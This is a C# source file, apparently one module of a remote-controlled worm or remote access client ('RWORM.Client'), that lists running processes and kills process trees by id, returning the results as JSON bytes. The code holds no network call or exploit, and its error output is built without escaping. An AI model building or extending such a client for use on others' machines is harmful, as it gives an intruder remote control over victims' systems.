using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.Json;

namespace RWORM.Client.Modules
{
    public static class ProcManager
    {
        public static byte[] ListProcesses()
        {
            var list = new List<object>();
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    list.Add(new
                    {
                        pid  = p.Id,
                        name = p.ProcessName,
                        mem  = p.WorkingSet64 / 1024,   // KB
                        title= p.MainWindowTitle
                    });
                }
                catch { }
            }
            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(list));
        }

        public static byte[] KillProcess(int pid)
        {
            try
            {
                Process.GetProcessById(pid).Kill(entireProcessTree: true);
                return Utf8Json("{\"ok\":true}");
            }
            catch (Exception ex) { return Utf8Json($"{{\"error\":\"{ex.Message}\"}}"); }
        }

        private static byte[] Utf8Json(string s) => System.Text.Encoding.UTF8.GetBytes(s);
    }
}
